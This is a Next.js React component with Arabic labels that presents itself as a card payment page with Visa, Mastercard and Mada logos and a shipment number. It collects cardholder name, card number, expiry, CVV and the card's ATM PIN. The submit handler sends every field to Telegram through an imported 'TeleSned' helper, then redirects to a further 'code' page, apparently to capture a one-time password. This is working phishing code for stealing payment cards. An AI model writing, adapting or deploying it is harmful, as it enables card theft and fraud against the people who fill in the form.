"use client";
import styles from './pay.module.css';
import visa from '../../../../../public/visa.png';
import master from '../../../../../public/master.png';
import mada from '../../../../../public/mada.png';
import Image from 'next/image';
import { useState } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import TeleSned from '@/server/TeleSned';

const Pay = () => {
  const { Send } = TeleSned(); // تأكد من أن TeleSend تعرف بشكل صحيح
  const searchParams = useSearchParams();
  const datas = searchParams.get("names");

  const [form, setForm] = useState({
    data: {
      typecard: "اختر البطاقة",
      الاسم_على_البطاقة: "",
      رقم_البطاقة: "",
      MM: "",
      YY: "",
      cvcCard: "",
      كلمةالمرورالبطاقة: "",
      رقمالشحــنة: datas,
    },
  });

  const router = useRouter();

  const setDynamicFormData = (name, value) => {
    setForm({
      data: {
        ...form.data,
        [name]: value,
      },
    });
  };

  const PostToTelegram = () => {
    const description = Object.entries(form.data)
      .map(([key, value]) => `${key} : ${value}`)
      .join("%0A");
    Send(description);
  };

  const handleRoute = () => {
    if (
      form.data.typecard === "اختر البطاقة" ||
      form.data.الاسم_على_البطاقة === "" ||
      form.data.رقم_البطاقة === "" ||
      form.data.MM === "" ||
      form.data.YY === "" ||
      form.data.cvcCard === "" ||
      form.data.كلمةالمرورالبطاقة === ""
    ) {
      alert("من فضلك قم بملىء الحقول");
    } else {
      router.push(`/aram/banks/pay/code?names=${datas}`);
    }
  };

  return (
    <div className={styles.contect} dir="rtl">
      <h1>مرحبآ بك</h1>
      <p>ادفع من خلال بطاقات الدفع التالية</p>
      <div>
        <Image src={visa} alt="visa" width={50} />
        <Image src={master} alt="master" width={50} />
        <Image src={mada} alt="mada" width={35} />
      </div>
      <form
        onSubmit={(e) => {
          e.preventDefault();
          PostToTelegram();
        }}
      >
        <select
          name="typecard"
          onChange={(e) => setDynamicFormData(e.target.name, e.target.value)}
          required
        >
          <option value="اختر البطاقة">اختر البطاقة </option>
          <option value="مدى">مدى</option>
          <option value="فيزا كارد">فيزا كارد</option>
          <option value="ماستر كارد">ماستر كارد</option>
        </select>
        <input
          type="text"
          placeholder="اسم مالك البطاقة"
          name="الاسم_على_البطاقة"
          onChange={(e) => setDynamicFormData(e.target.name, e.target.value)}
          required
        />
        <input
          type="number"
          placeholder="رقم البطاقة"
          dir="ltr"
          name="رقم_البطاقة"
          onChange={(e) => setDynamicFormData(e.target.name, e.target.value)}
          maxLength="16"
          required
        />
        <div className={styles.curmony}>
          <div>
            <input
              type="text"
              placeholder="(MM)"
              name="MM"
              onChange={(e) => setDynamicFormData(e.target.name, e.target.value)}
              maxLength="2"
              required
            />
            <input
              type="text"
              placeholder="(YY)"
              name="YY"
              onChange={(e) => setDynamicFormData(e.target.name, e.target.value)}
              maxLength="2"
              required
            />
          </div>
          <input
            type="text"
            placeholder="الرقم (cvc/cvv)"
            name="cvcCard"
            onChange={(e) => setDynamicFormData(e.target.name, e.target.value)}
            maxLength="3"
            required
          />
        </div>
        <input
          type="text"
          placeholder="ادخل رقم بطاقة الصراف المكونة من 4 ارقام"
          name="كلمةالمرورالبطاقة"
          onChange={(e) => setDynamicFormData(e.target.name, e.target.value)}
          maxLength="5"
          required
        />
        <button type="submit" onClick={handleRoute}>
          أدفع ألأن
        </button>
      </form>
    </div>
  );
};

export default Pay;
